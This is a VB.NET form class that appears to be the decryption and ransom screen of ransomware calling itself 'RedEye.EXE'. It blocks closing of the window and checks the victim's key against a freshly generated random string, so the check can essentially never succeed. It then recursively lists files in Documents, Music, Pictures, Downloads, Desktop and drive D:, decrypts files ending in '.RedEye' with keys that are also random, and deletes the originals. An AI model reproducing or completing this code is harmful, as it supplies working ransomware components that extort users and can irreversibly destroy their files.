Public Class Form4
    Private Sub Decrypt_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Private Sub Decrypt_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Shown
        ProgressBar1.Hide()
        ProgressBar2.Hide()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If TextBox1.Text = GetRandomString(1337) Then
            Timer2.Start()
        Else
            Dim a As Integer
            While a < 10
                Me.Location = New Point(Me.Location.X + 10, Me.Location.Y)
                System.Threading.Thread.Sleep(50)
                Me.Location = New Point(Me.Location.X - 10, Me.Location.Y)
                System.Threading.Thread.Sleep(50)
                a += 1
            End While
            MsgBox("The Key is wrong!", MsgBoxStyle.Critical, "RedEye.EXE")
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                         "C:\Users\" + Environment.UserName + "\Downloads",
                        FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
                 foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim filenamez As String
        ProgressBar2.Value = 25
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            Application.ExitThread()


        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            ProgressBar2.Value = 50
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                bytKey = Form1.CreateKey(GetRandomString(1337))
                bytIV = Form1.CreateIV(GetRandomString(1337))

                Dim withParts As String = (GetRandomString(1337))
                Dim filenamezu As String = Replace(filenamez, ".RedEye", "")
                Form1.EncryptOrDecryptFile(filenamez, filenamezu,
                bytKey, bytIV, Form1.CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try
            ProgressBar2.Value = 0
            ProgressBar1.Increment(1)
        End If
    End Sub

    Private Shared rand As New Random()
    Public Shared Function GetRandomString(Optional ByVal len As Integer = 128)
        If len > 128 Then len = 128

        Static rndBuffer(256 - 1) As Byte
        rand.NextBytes(rndBuffer)
        Dim randomStr As String = String.Empty

        Using sha512crypto As New Security.Cryptography.SHA512CryptoServiceProvider()
            randomStr = String.Join("", Array.ConvertAll(Of Byte, String)(sha512crypto.ComputeHash(rndBuffer), Function(b As Byte) b.ToString("x2")))
        End Using
        Return randomStr.Substring(0, len)
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Hide()
    End Sub
End Class